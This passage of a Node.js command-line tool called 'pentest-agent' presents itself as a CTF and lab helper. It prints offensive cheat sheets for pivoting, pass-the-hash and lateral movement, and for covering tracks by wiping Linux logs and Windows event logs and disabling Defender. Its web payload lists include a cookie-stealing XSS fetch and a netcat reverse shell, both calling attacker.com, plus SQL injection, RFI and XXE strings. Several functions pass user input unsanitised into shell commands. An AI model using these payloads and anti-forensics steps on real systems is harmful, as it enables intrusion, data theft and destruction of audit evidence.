  console.log(chalk.cyan('ssh -L <local-port>:<target-ip>:<target-port> user@pivot-host'));

  console.log(chalk.yellow('\n2. SSH Remote Port Forwarding:'));
  console.log(chalk.cyan('ssh -R <remote-port>:localhost:<local-port> user@pivot-host'));

  console.log(chalk.yellow('\n3. SSH Dynamic Port Forwarding (SOCKS):'));
  console.log(chalk.cyan('ssh -D 1080 user@pivot-host'));
  console.log(chalk.gray('Then configure proxychains: socks4 127.0.0.1 1080'));

  console.log(chalk.yellow('\n4. Chisel (Reverse Tunnel):'));
  console.log(chalk.cyan('Server: ./chisel server -p 8000 --reverse'));
  console.log(chalk.cyan('Client: ./chisel client <your-ip>:8000 R:socks'));

  console.log(chalk.yellow('\n5. Metasploit Autoroute:'));
  console.log(chalk.cyan('run autoroute -s <target-subnet>'));

  console.log(chalk.yellow('\n6. Socat:'));
  console.log(chalk.cyan('socat TCP-LISTEN:8080,fork TCP:<target>:80'));

  console.log(chalk.yellow('\n7. ProxyChains:'));
  console.log(chalk.cyan('proxychains nmap -sT <target>'));
}

async function lateralMovementHelper() {
  console.log(chalk.red('\n↔️  Lateral Movement Techniques:\n'));

  console.log(chalk.yellow('1. Pass-the-Hash (Windows):'));
  console.log(chalk.cyan('pth-winexe -U domain/user%hash //<target> cmd'));
  console.log(chalk.cyan('crackmapexec smb <target> -u user -H <ntlm-hash>'));

  console.log(chalk.yellow('\n2. PSExec:'));
  console.log(chalk.cyan('psexec.py domain/user:password@<target>'));
  console.log(chalk.cyan('impacket-psexec user@<target>'));

  console.log(chalk.yellow('\n3. WMI:'));
  console.log(chalk.cyan('wmiexec.py domain/user:password@<target>'));

  console.log(chalk.yellow('\n4. WinRM:'));
  console.log(chalk.cyan('evil-winrm -i <target> -u user -p password'));

  console.log(chalk.yellow('\n5. RDP:'));
  console.log(chalk.cyan('xfreerdp /u:user /p:password /v:<target>'));

  console.log(chalk.yellow('\n6. SSH (Linux):'));
  console.log(chalk.cyan('ssh user@<target>'));

  console.log(chalk.yellow('\n7. CrackMapExec:'));
  console.log(chalk.cyan('crackmapexec smb <target-range> -u user -p password --shares'));
  console.log(chalk.cyan('crackmapexec smb <target> -u user -p password -x "whoami"'));
}

async function coverTracksHelper() {
  const { system } = await inquirer.prompt([
    {
      type: 'list',
      name: 'system',
      message: 'Select target system:',
      choices: ['Linux', 'Windows']
    }
  ]);

  console.log(chalk.yellow('\n🧹 Covering Tracks:\n'));

  if (system === 'Linux') {
    console.log(chalk.cyan('Clear bash history:'));
    console.log(chalk.gray('history -c && history -w'));
    console.log(chalk.gray('rm ~/.bash_history'));
    console.log(chalk.gray('unset HISTFILE'));

    console.log(chalk.cyan('\nClear system logs:'));
    console.log(chalk.gray('echo "" > /var/log/auth.log'));
    console.log(chalk.gray('echo "" > /var/log/syslog'));
    console.log(chalk.gray('shred -vfz /var/log/auth.log'));

    console.log(chalk.cyan('\nClear specific user from logs:'));
    console.log(chalk.gray('sed -i \'/username/d\' /var/log/auth.log'));

    console.log(chalk.cyan('\nDisable logging temporarily:'));
    console.log(chalk.gray('service rsyslog stop'));

  } else {
    console.log(chalk.cyan('Clear PowerShell history:'));
    console.log(chalk.gray('Clear-History'));
    console.log(chalk.gray('Remove-Item (Get-PSReadlineOption).HistorySavePath'));

    console.log(chalk.cyan('\nClear Windows Event Logs:'));
    console.log(chalk.gray('wevtutil cl System'));
    console.log(chalk.gray('wevtutil cl Security'));
    console.log(chalk.gray('wevtutil cl Application'));

    console.log(chalk.cyan('\nClear specific events:'));
    console.log(chalk.gray('wevtutil qe Security /q:"*[System[(EventID=4624)]]" /f:text'));

    console.log(chalk.cyan('\nDisable Windows Defender:'));
    console.log(chalk.gray('Set-MpPreference -DisableRealtimeMonitoring $true'));
  }

  console.log(chalk.red('\n⚠️  WARNING: Only use these techniques in authorized testing environments!'));
}

// CTF Helper Module
async function ctfMode() {
  console.log(chalk.blue('\n🚩 CTF Helper Module\n'));

  const answers = await inquirer.prompt([
    {
      type: 'list',
      name: 'category',
      message: 'Select CTF category:',
      choices: [
        'Cryptography',
        'Steganography',
        'Forensics',
        'Binary Exploitation',
        'Web Exploitation',
        'OSINT',
        'Back'
      ]
    }
  ]);

  switch (answers.category) {
    case 'Cryptography':
      await cryptoHelper();
      break;
    case 'Steganography':
      await stegoHelper();
      break;
    case 'Forensics':
      await forensicsHelper();
      break;
    case 'Binary Exploitation':
      await binaryExploitHelper();
      break;
    case 'Web Exploitation':
      await webExploitHelper();
      break;
    case 'OSINT':
      await osintHelper();
      break;
  }
}

async function cryptoHelper() {
  console.log(chalk.green('\n🔐 Cryptography Tools:\n'));

  const { tool } = await inquirer.prompt([
    {
      type: 'list',
      name: 'tool',
      message: 'Select crypto tool:',
      choices: [
        'Base64 Decode',
        'ROT13',
        'Caesar Cipher',
        'XOR Cipher',
        'Hash Cracking',
        'RSA Tools',
        'CyberChef (Online)',
        'Custom Command'
      ]
    }
  ]);

  switch (tool) {
    case 'Base64 Decode':
      const { b64 } = await inquirer.prompt([
        { type: 'input', name: 'b64', message: 'Enter base64 string:' }
      ]);
      const decoded = Buffer.from(b64, 'base64').toString('utf-8');
      console.log(chalk.green('\nDecoded:'), chalk.cyan(decoded));
      break;

    case 'ROT13':
      const { rot13Input } = await inquirer.prompt([
        { type: 'input', name: 'rot13Input', message: 'Enter text:' }
      ]);
      const rot13 = rot13Input.replace(/[a-zA-Z]/g, (c) => {
        return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
      });
      console.log(chalk.green('\nROT13:'), chalk.cyan(rot13));
      break;

    case 'Caesar Cipher':
      const caesarAnswers = await inquirer.prompt([
        { type: 'input', name: 'text', message: 'Enter text:' },
        { type: 'input', name: 'shift', message: 'Enter shift (default: bruteforce all):', default: 'all' }
      ]);

      if (caesarAnswers.shift === 'all') {
        console.log(chalk.green('\nBruteforcing all shifts:\n'));
        for (let shift = 1; shift <= 25; shift++) {
          const result = caesarAnswers.text.replace(/[a-zA-Z]/g, (c) => {
            const base = c <= 'Z' ? 65 : 97;
            return String.fromCharCode(((c.charCodeAt(0) - base + shift) % 26) + base);
          });
          console.log(chalk.yellow(`Shift ${shift}:`), chalk.cyan(result));
        }
      }
      break;

    case 'XOR Cipher':
      console.log(chalk.cyan('\nUse CyberChef or custom Python script for XOR'));
      console.log(chalk.gray('python -c "print(\'\'.join(chr(ord(c) ^ <key>) for c in \'<text>\'))"'));
      break;

    case 'Hash Cracking':
      await hashIdentification();
      break;

    case 'RSA Tools':
      console.log(chalk.cyan('\nRSA Attack Tools:'));
      console.log(chalk.gray('RsaCtfTool: python RsaCtfTool.py --publickey <file> --uncipherfile <file>'));
      console.log(chalk.gray('factordb.com - For factoring weak modulus'));
      console.log(chalk.gray('openssl rsa -in key.pem -text -noout'));
      break;

    case 'CyberChef (Online)':
      console.log(chalk.cyan('\nCyberChef: https://gchq.github.io/CyberChef/'));
      console.log(chalk.gray('Swiss army knife for crypto operations'));
      break;

    case 'Custom Command':
      const { customCmd } = await inquirer.prompt([
        { type: 'input', name: 'customCmd', message: 'Enter command:' }
      ]);
      await runCommand(customCmd, 'Running custom command...');
      break;
  }
}

async function stegoHelper() {
  console.log(chalk.magenta('\n🖼️  Steganography Tools:\n'));

  const { file } = await inquirer.prompt([
    {
      type: 'input',
      name: 'file',
      message: 'Enter file path:',
    }
  ]);

  const { tool } = await inquirer.prompt([
    {
      type: 'list',
      name: 'tool',
      message: 'Select stego tool:',
      choices: [
        'steghide extract',
        'binwalk',
        'exiftool',
        'strings',
        'zsteg (PNG/BMP)',
        'stegsolve',
        'foremost',
        'All (run all tools)'
      ]
    }
  ]);

  console.log(chalk.cyan('\n🔍 Running steganography analysis...\n'));

  if (tool === 'steghide extract' || tool === 'All (run all tools)') {
    const { password } = await inquirer.prompt([
      { type: 'input', name: 'password', message: 'Enter steghide password (or leave empty):' }
    ]);
    const steghideCmd = password ? `steghide extract -sf ${file} -p ${password}` : `steghide extract -sf ${file}`;
    await runCommand(steghideCmd, 'Extracting with steghide...');
  }

  if (tool === 'binwalk' || tool === 'All (run all tools)') {
    await runCommand(`binwalk ${file}`, 'Running binwalk...');
    await runCommand(`binwalk -e ${file}`, 'Extracting with binwalk...');
  }

  if (tool === 'exiftool' || tool === 'All (run all tools)') {
    await runCommand(`exiftool ${file}`, 'Running exiftool...');
  }

  if (tool === 'strings' || tool === 'All (run all tools)') {
    await runCommand(`strings ${file}`, 'Running strings...');
  }

  if (tool === 'zsteg (PNG/BMP)' || tool === 'All (run all tools)') {
    await runCommand(`zsteg ${file}`, 'Running zsteg...');
  }

  if (tool === 'foremost' || tool === 'All (run all tools)') {
    await runCommand(`foremost -i ${file}`, 'Running foremost...');
  }

  if (tool === 'stegsolve') {
    console.log(chalk.yellow('Launch stegsolve manually (GUI tool)'));
    console.log(chalk.cyan(`java -jar stegsolve.jar ${file}`));
  }
}

async function forensicsHelper() {
  console.log(chalk.blue('\n🔬 Forensics Tools:\n'));

  const { category } = await inquirer.prompt([
    {
      type: 'list',
      name: 'category',
      message: 'Select forensics category:',
      choices: [
        'Memory Dump Analysis',
        'Disk Image Analysis',
        'Network Capture (PCAP)',
        'File Recovery',
        'Metadata Analysis'
      ]
    }
  ]);

  switch (category) {
    case 'Memory Dump Analysis':
      const { dumpFile } = await inquirer.prompt([
        { type: 'input', name: 'dumpFile', message: 'Enter memory dump file:' }
      ]);

      console.log(chalk.cyan('\nVolatility Commands:\n'));
      console.log(chalk.gray(`volatility -f ${dumpFile} imageinfo`));
      console.log(chalk.gray(`volatility -f ${dumpFile} --profile=<profile> pslist`));
      console.log(chalk.gray(`volatility -f ${dumpFile} --profile=<profile> netscan`));
      console.log(chalk.gray(`volatility -f ${dumpFile} --profile=<profile> filescan`));
      console.log(chalk.gray(`volatility -f ${dumpFile} --profile=<profile> dumpfiles -Q <offset> -D output/`));
      break;

    case 'Disk Image Analysis':
      const { diskImage } = await inquirer.prompt([
        { type: 'input', name: 'diskImage', message: 'Enter disk image file:' }
      ]);

      console.log(chalk.cyan('\nAutopsy/Sleuthkit Commands:\n'));
      console.log(chalk.gray(`mmls ${diskImage}`));
      console.log(chalk.gray(`fls -r ${diskImage}`));
      console.log(chalk.gray(`icat ${diskImage} <inode>`));
      console.log(chalk.gray(`autopsy # Launch GUI`));
      break;

    case 'Network Capture (PCAP)':
      const { pcapFile } = await inquirer.prompt([
        { type: 'input', name: 'pcapFile', message: 'Enter PCAP file:' }
      ]);

      console.log(chalk.cyan('\nNetwork Analysis Tools:\n'));
      await runCommand(`tcpdump -r ${pcapFile}`, 'Reading PCAP with tcpdump...');
      console.log(chalk.gray(`\nWireshark: wireshark ${pcapFile}`));
      console.log(chalk.gray(`tshark -r ${pcapFile} -Y http`));
      console.log(chalk.gray(`tshark -r ${pcapFile} -Y "http.request" -T fields -e http.host -e http.request.uri`));
      console.log(chalk.gray(`tcpflow -r ${pcapFile}`));
      break;

    case 'File Recovery':
      const { device } = await inquirer.prompt([
        { type: 'input', name: 'device', message: 'Enter device/image path:' }
      ]);

      console.log(chalk.cyan('\nFile Recovery Tools:\n'));
      console.log(chalk.gray(`foremost -i ${device} -o recovered/`));
      console.log(chalk.gray(`scalpel ${device} -o recovered/`));
      console.log(chalk.gray(`photorec ${device}`));
      console.log(chalk.gray(`testdisk ${device}`));
      break;

    case 'Metadata Analysis':
      const { metaFile } = await inquirer.prompt([
        { type: 'input', name: 'metaFile', message: 'Enter file path:' }
      ]);

      await runCommand(`exiftool ${metaFile}`, 'Analyzing metadata...');
      await runCommand(`file ${metaFile}`, 'Checking file type...');
      await runCommand(`strings ${metaFile} | head -50`, 'Extracting strings...');
      break;
  }
}

async function binaryExploitHelper() {
  console.log(chalk.red('\n💣 Binary Exploitation Helper:\n'));

  const { file } = await inquirer.prompt([
    {
      type: 'input',
      name: 'file',
      message: 'Enter binary file path:',
    }
  ]);

  const { action } = await inquirer.prompt([
    {
      type: 'list',
      name: 'action',
      message: 'Select action:',
      choices: [
        'File Information',
        'Check Security Protections',
        'Strings Analysis',
        'Disassemble (objdump)',
        'Debug with GDB',
        'Generate Pattern (pwntools)',
        'ROPgadget Search',
        'All Analysis'
      ]
    }
  ]);

  console.log(chalk.cyan('\n🔍 Analyzing binary...\n'));

  if (action === 'File Information' || action === 'All Analysis') {
    await runCommand(`file ${file}`, 'Checking file type...');
    await runCommand(`ls -la ${file}`, 'File permissions...');
  }

  if (action === 'Check Security Protections' || action === 'All Analysis') {
    await runCommand(`checksec ${file}`, 'Checking security protections...');
    await runCommand(`rabin2 -I ${file}`, 'Running rabin2...');
  }

  if (action === 'Strings Analysis' || action === 'All Analysis') {
    await runCommand(`strings ${file}`, 'Extracting strings...');
  }

  if (action === 'Disassemble (objdump)' || action === 'All Analysis') {
    await runCommand(`objdump -d ${file} | head -100`, 'Disassembling...');
    console.log(chalk.gray('\nAlternatives:'));
    console.log(chalk.gray(`radare2 ${file}`));
    console.log(chalk.gray(`ghidra ${file}`));
  }

  if (action === 'Debug with GDB') {
    console.log(chalk.yellow('GDB Commands:\n'));
    console.log(chalk.cyan(`gdb ${file}`));
    console.log(chalk.gray('gdb-peda/gdb-gef/pwndbg for enhanced debugging'));
  }

  if (action === 'Generate Pattern (pwntools)') {
    const { length } = await inquirer.prompt([
      { type: 'input', name: 'length', message: 'Pattern length:', default: '100' }
    ]);
    console.log(chalk.cyan('\nGenerate pattern:'));
    console.log(chalk.gray(`python -c "from pwn import *; print(cyclic(${length}))"`));
    console.log(chalk.cyan('\nFind offset:'));
    console.log(chalk.gray(`python -c "from pwn import *; print(cyclic_find('<value>'))"`));
  }

  if (action === 'ROPgadget Search' || action === 'All Analysis') {
    await runCommand(`ROPgadget --binary ${file} | head -50`, 'Searching ROP gadgets...');
    console.log(chalk.gray('\nGenerate ROP chain:'));
    console.log(chalk.gray(`ROPgadget --binary ${file} --ropchain`));
  }
}

async function webExploitHelper() {
  console.log(chalk.green('\n🌐 Web Exploitation Helper:\n'));

  const { exploit } = await inquirer.prompt([
    {
      type: 'list',
      name: 'exploit',
      message: 'Select web exploit type:',
      choices: [
        'SQL Injection',
        'XSS (Cross-Site Scripting)',
        'CSRF',
        'LFI/RFI (File Inclusion)',
        'Command Injection',
        'SSRF',
        'XXE',
        'Deserialization'
      ]
    }
  ]);

  switch (exploit) {
    case 'SQL Injection':
      console.log(chalk.cyan('\n💉 SQL Injection Payloads:\n'));
      console.log(chalk.gray("' OR '1'='1"));
      console.log(chalk.gray("' OR '1'='1' --"));
      console.log(chalk.gray("' OR '1'='1' /*"));
      console.log(chalk.gray("admin' --"));
      console.log(chalk.gray("' UNION SELECT NULL,NULL,NULL--"));
      console.log(chalk.gray("' UNION SELECT username,password FROM users--"));
      console.log(chalk.gray("1' ORDER BY 1--"));
      console.log(chalk.gray("1' AND 1=1--"));
      console.log(chalk.gray("1' AND 1=2--"));
      console.log(chalk.yellow('\nTools: sqlmap, havij, NoSQLMap'));
      break;

    case 'XSS (Cross-Site Scripting)':
      console.log(chalk.cyan('\n🔥 XSS Payloads:\n'));
      console.log(chalk.gray('<script>alert(1)</script>'));
      console.log(chalk.gray('<img src=x onerror=alert(1)>'));
      console.log(chalk.gray('<svg/onload=alert(1)>'));
      console.log(chalk.gray('<iframe src="javascript:alert(1)">'));
      console.log(chalk.gray('<body onload=alert(1)>'));
      console.log(chalk.gray('javascript:alert(document.cookie)'));
      console.log(chalk.gray('<script>fetch(\'http://attacker.com/?c=\'+document.cookie)</script>'));
      break;

    case 'CSRF':
      console.log(chalk.cyan('\n🎭 CSRF Attack:\n'));
      console.log(chalk.gray('<form action="http://target.com/change-password" method="POST">'));
      console.log(chalk.gray('  <input type="hidden" name="password" value="hacked">'));
      console.log(chalk.gray('  <input type="submit" value="Click me">'));
      console.log(chalk.gray('</form>'));
      break;

    case 'LFI/RFI (File Inclusion)':
      console.log(chalk.cyan('\n📁 LFI/RFI Payloads:\n'));
      console.log(chalk.gray('../../../../../etc/passwd'));
      console.log(chalk.gray('....//....//....//etc/passwd'));
      console.log(chalk.gray('php://filter/convert.base64-encode/resource=index.php'));
      console.log(chalk.gray('php://input (with POST data)'));
      console.log(chalk.gray('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+'));
      console.log(chalk.gray('expect://whoami'));
      console.log(chalk.gray('http://attacker.com/shell.txt (RFI)'));
      break;

    case 'Command Injection':
      console.log(chalk.cyan('\n⚡ Command Injection Payloads:\n'));
      console.log(chalk.gray('; whoami'));
      console.log(chalk.gray('| whoami'));
      console.log(chalk.gray('|| whoami'));
      console.log(chalk.gray('& whoami'));
      console.log(chalk.gray('&& whoami'));
      console.log(chalk.gray('`whoami`'));
      console.log(chalk.gray('$(whoami)'));
      console.log(chalk.gray('; nc attacker.com 4444 -e /bin/bash'));
      break;

    case 'SSRF':
      console.log(chalk.cyan('\n🔄 SSRF Payloads:\n'));
      console.log(chalk.gray('http://localhost'));
      console.log(chalk.gray('http://127.0.0.1'));
      console.log(chalk.gray('http://0.0.0.0'));
      console.log(chalk.gray('http://169.254.169.254 (AWS metadata)'));
      console.log(chalk.gray('file:///etc/passwd'));
      console.log(chalk.gray('http://[::1]'));
      break;

    case 'XXE':
      console.log(chalk.cyan('\n📄 XXE Payloads:\n'));
      console.log(chalk.gray('<?xml version="1.0"?>'));
      console.log(chalk.gray('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'));
      console.log(chalk.gray('<root>&xxe;</root>'));
      console.log(chalk.gray('\nSSRF via XXE:'));
      console.log(chalk.gray('<!ENTITY xxe SYSTEM "http://attacker.com">'));
      break;

    case 'Deserialization':
      console.log(chalk.cyan('\n🔓 Deserialization Attacks:\n'));
      console.log(chalk.yellow('PHP:'));
      console.log(chalk.gray('Generate payload with PHPGGC'));
      console.log(chalk.yellow('\nJava:'));
      console.log(chalk.gray('Use ysoserial to generate payloads'));
      console.log(chalk.yellow('\nPython:'));
      console.log(chalk.gray('Pickle exploitation'));
      break;
  }
}

async function osintHelper() {
  console.log(chalk.blue('\n🔎 OSINT Helper:\n'));

  const { category } = await inquirer.prompt([
    {
      type: 'list',
      name: 'category',
      message: 'Select OSINT category:',
      choices: [
        'Email/Username Search',
        'Domain/IP Investigation',
        'Social Media',
        'Google Dorking',
        'Metadata Extraction',
        'Geolocation'
      ]
    }
  ]);

  switch (category) {
    case 'Email/Username Search':
      console.log(chalk.cyan('\n📧 Email/Username OSINT:\n'));
      console.log(chalk.yellow('Tools:'));
      console.log(chalk.gray('- Sherlock (username search across platforms)'));
      console.log(chalk.gray('- theHarvester (email harvesting)'));
      console.log(chalk.gray('- hunter.io (email finder)'));
      console.log(chalk.gray('- haveibeenpwned.com (breach check)'));
      console.log(chalk.yellow('\nCommands:'));
      console.log(chalk.gray('sherlock <username>'));
      console.log(chalk.gray('theHarvester -d <domain> -b google'));
      break;

    case 'Domain/IP Investigation':
      const { target } = await inquirer.prompt([
        { type: 'input', name: 'target', message: 'Enter domain/IP:' }
      ]);

      console.log(chalk.cyan('\n🌐 Investigating target...\n'));
      await runCommand(`whois ${target}`, 'Running WHOIS...');
      await runCommand(`dig ${target}`, 'DNS lookup...');
      await runCommand(`nslookup ${target}`, 'NSLookup...');

      console.log(chalk.yellow('\nOnline Tools:'));
      console.log(chalk.gray(`- Shodan.io: https://www.shodan.io/host/${target}`));
      console.log(chalk.gray(`- Censys: https://censys.io/`));
      console.log(chalk.gray(`- VirusTotal: https://www.virustotal.com/`));
      break;

    case 'Social Media':
      console.log(chalk.cyan('\n👥 Social Media OSINT:\n'));
      console.log(chalk.yellow('Tools:'));
      console.log(chalk.gray('- Sherlock: sherlock <username>'));
      console.log(chalk.gray('- social-analyzer'));
      console.log(chalk.gray('- twint (Twitter)'));
      console.log(chalk.gray('- InstagramOSINT'));
      console.log(chalk.yellow('\nManual Search:'));
      console.log(chalk.gray('- Google: site:facebook.com "target name"'));
      console.log(chalk.gray('- LinkedIn, Twitter, Instagram searches'));
      break;

    case 'Google Dorking':
      console.log(chalk.cyan('\n🔍 Google Dorking:\n'));
      console.log(chalk.yellow('Useful Dorks:'));
      console.log(chalk.gray('site:target.com filetype:pdf'));
      console.log(chalk.gray('site:target.com inurl:admin'));
      console.log(chalk.gray('intitle:"index of" site:target.com'));
      console.log(chalk.gray('site:pastebin.com "target.com"'));
      console.log(chalk.gray('site:github.com "target.com" password'));
      console.log(chalk.gray('inurl:"/phpinfo.php" site:target.com'));
      console.log(chalk.gray('filetype:sql "password" site:target.com'));
      console.log(chalk.gray('site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf'));
      break;

    case 'Metadata Extraction':
      const { file } = await inquirer.prompt([
        { type: 'input', name: 'file', message: 'Enter file path:' }
      ]);
      await runCommand(`exiftool ${file}`, 'Extracting metadata...');
      console.log(chalk.yellow('\nTools: exiftool, metagoofil, FOCA'));
      break;

    case 'Geolocation':
      console.log(chalk.cyan('\n📍 Geolocation OSINT:\n'));
      console.log(chalk.yellow('Tools:'));
      console.log(chalk.gray('- Google Maps'));
      console.log(chalk.gray('- Google Earth'));
      console.log(chalk.gray('- GeoSocial Footprint'));
      console.log(chalk.gray('- Creepy'));
      console.log(chalk.yellow('\nImage Geolocation:'));
      console.log(chalk.gray('- Check EXIF GPS data with exiftool'));
      console.log(chalk.gray('- Reverse image search (Google, TinEye)'));
      break;
  }
}

// Utilities Module
async function utilitiesMode() {
  console.log(chalk.cyan('\n🛠️  Utilities\n'));

  const answers = await inquirer.prompt([
    {
      type: 'list',
      name: 'utility',
      message: 'Select utility:',
      choices: [
        'Generate Wordlist',
        'Network Interface Info',
        'Start/Stop Services',
        'Quick Notes',
        'Encode/Decode',
        'Back'
      ]
    }
  ]);

  switch (answers.utility) {
    case 'Generate Wordlist':
      await wordlistGenerator();
      break;
    case 'Network Interface Info':
      await networkInfo();
      break;
    case 'Start/Stop Services':
      await serviceManager();
      break;
    case 'Quick Notes':
      await quickNotes();
      break;
    case 'Encode/Decode':
      await encodeDecode();
      break;
  }
}

async function wordlistGenerator() {
  const { tool } = await inquirer.prompt([
    {
      type: 'list',
      name: 'tool',
      message: 'Select wordlist generator:',
      choices: ['Crunch', 'CeWL', 'Custom']
    }
  ]);

  if (tool === 'Crunch') {
    const answers = await inquirer.prompt([
      { type: 'input', name: 'min', message: 'Min length:', default: '4' },
      { type: 'input', name: 'max', message: 'Max length:', default: '8' },
      { type: 'input', name: 'charset', message: 'Character set (optional):', default: '' },
      { type: 'input', name: 'output', message: 'Output file:', default: 'wordlist.txt' }
    ]);

    const charset = answers.charset ? answers.charset : '';
    const cmd = `crunch ${answers.min} ${answers.max} ${charset} -o ${answers.output}`;
    console.log(chalk.cyan(`\n📝 Generating wordlist...\n`));
    await runCommand(cmd, 'Running crunch...');

  } else if (tool === 'CeWL') {
    const answers = await inquirer.prompt([
      { type: 'input', name: 'url', message: 'Enter URL:' },
      { type: 'input', name: 'depth', message: 'Crawl depth:', default: '2' },
      { type: 'input', name: 'minlen', message: 'Min word length:', default: '3' },
      { type: 'input', name: 'output', message: 'Output file:', default: 'wordlist.txt' }
    ]);

    const cmd = `cewl -d ${answers.depth} -m ${answers.minlen} -w ${answers.output} ${answers.url}`;
    console.log(chalk.cyan(`\n📝 Generating wordlist from website...\n`));
    await runCommand(cmd, 'Running CeWL...');
  }
}

async function networkInfo() {
  console.log(chalk.cyan('\n🌐 Network Interface Information:\n'));

  await runCommand('ifconfig', 'Getting network interfaces...');
  await runCommand('ip addr show', 'IP addresses...');
  await runCommand('route -n', 'Routing table...');
  await runCommand('netstat -tuln', 'Open ports...');
}

async function serviceManager() {
  const { action } = await inquirer.prompt([
    {
      type: 'list',
      name: 'action',
      message: 'Select action:',
      choices: [
        'Start Apache',
        'Stop Apache',
        'Start PostgreSQL',
        'Stop PostgreSQL',
        'Start SSH',
        'Stop SSH',
        'Custom Service'
      ]
    }
  ]);

  const serviceMap = {
    'Start Apache': 'systemctl start apache2',
    'Stop Apache': 'systemctl stop apache2',
    'Start PostgreSQL': 'systemctl start postgresql',
    'Stop PostgreSQL': 'systemctl stop postgresql',
    'Start SSH': 'systemctl start ssh',
    'Stop SSH': 'systemctl stop ssh',
  };

  if (action === 'Custom Service') {
    const { service, act } = await inquirer.prompt([
      { type: 'input', name: 'service', message: 'Service name:' },
      { type: 'list', name: 'act', message: 'Action:', choices: ['start', 'stop', 'restart', 'status'] }
    ]);
    await runCommand(`systemctl ${act} ${service}`, `${act} ${service}...`);
  } else {
    await runCommand(serviceMap[action], action);
  }
}

async function quickNotes() {
  const notesFile = 'pentest-notes.md';

  const { action } = await inquirer.prompt([
    {
      type: 'list',
      name: 'action',
      message: 'Notes action:',
      choices: ['Add Note', 'View Notes', 'Clear Notes']
    }
  ]);

  if (action === 'Add Note') {
    const { note } = await inquirer.prompt([
      { type: 'input', name: 'note', message: 'Enter note:' }
    ]);

    const timestamp = new Date().toLocaleString();
    const noteEntry = `\n[${timestamp}] ${note}\n`;

    try {
      const existing = await fs.readFile(notesFile, 'utf-8').catch(() => '');
      await fs.writeFile(notesFile, existing + noteEntry);
      console.log(chalk.green('✅ Note saved!'));
    } catch (error) {
      console.log(chalk.red('Failed to save note'));
    }

  } else if (action === 'View Notes') {
    try {
      const notes = await fs.readFile(notesFile, 'utf-8');
      console.log(chalk.cyan('\n📝 Your Notes:\n'));
      console.log(notes);
    } catch (error) {
      console.log(chalk.yellow('No notes found'));
    }

  } else if (action === 'Clear Notes') {
    await fs.writeFile(notesFile, '');
    console.log(chalk.green('✅ Notes cleared!'));
  }
}

async function encodeDecode() {
  const { action } = await inquirer.prompt([
    {
      type: 'list',
      name: 'action',
      message: 'Select action:',
      choices: ['Base64 Encode', 'Base64 Decode', 'URL Encode', 'URL Decode', 'Hex Encode', 'Hex Decode']
    }
  ]);

  const { input } = await inquirer.prompt([
    { type: 'input', name: 'input', message: 'Enter text:' }
  ]);

  let result = '';

  switch (action) {
    case 'Base64 Encode':
      result = Buffer.from(input).toString('base64');
      break;
    case 'Base64 Decode':
      result = Buffer.from(input, 'base64').toString('utf-8');
      break;
    case 'URL Encode':
      result = encodeURIComponent(input);
      break;
    case 'URL Decode':
      result = decodeURIComponent(input);
      break;
    case 'Hex Encode':
      result = Buffer.from(input).toString('hex');
      break;
    case 'Hex Decode':
      result = Buffer.from(input, 'hex').toString('utf-8');
      break;
  }

  console.log(chalk.green('\nResult:'), chalk.cyan(result));
}

// Main Menu
async function mainMenu() {
  console.clear();
  console.log(banner);

  const answer = await inquirer.prompt([
    {
      type: 'list',
      name: 'mode',
      message: 'Select mode:',
      choices: [
        '🔍 Reconnaissance',
        '💥 Exploitation',
        '🎯 Post-Exploitation',
        '🚩 CTF Helper',
        '🛠️  Utilities',
        '❌ Exit'
      ],
      pageSize: 10
    }
  ]);

  switch (answer.mode) {
    case '🔍 Reconnaissance':
      await reconMode();
      await mainMenu();
      break;
    case '💥 Exploitation':
      await exploitMode();
      await mainMenu();
      break;
    case '🎯 Post-Exploitation':
      await postExploitMode();
      await mainMenu();
      break;
    case '🚩 CTF Helper':
      await ctfMode();
      await mainMenu();
      break;
    case '🛠️  Utilities':
      await utilitiesMode();
      await mainMenu();
      break;
    case '❌ Exit':
      console.log(chalk.green('\n👋 Happy Hacking!\n'));
      process.exit(0);
  }
}

// CLI Commands
program
  .name('pentest-agent')
  .description('Advanced Pentesting CLI Agent for CTF and Security Labs')
  .version('1.0.0');

program
  .command('interactive')
  .alias('i')
  .description('Start interactive mode')
  .action(mainMenu);

program
  .command('scan')
  .description('Quick nmap scan')
  .argument('<target>', 'Target IP or hostname')
  .option('-p, --ports <ports>', 'Port range', '1-1000')
  .action(async (target, options) => {
    const cmd = `nmap -T4 -p ${options.ports} ${target}`;
    console.log(chalk.cyan(`Running: ${cmd}\n`));
    await runCommand(cmd, 'Scanning...');
  });

program
  .command('wordlist')
  .description('Generate wordlist with crunch')
  .requiredOption('-m, --min <length>', 'Minimum length')
  .requiredOption('-M, --max <length>', 'Maximum length')
  .option('-o, --output <file>', 'Output file', 'wordlist.txt')
  .action(async (options) => {
    const cmd = `crunch ${options.min} ${options.max} -o ${options.output}`;
    await runCommand(cmd, 'Generating wordlist...');
  });

program.parse();

// If no command specified, run interactive mode
if (process.argv.length === 2) {
  mainMenu();
}
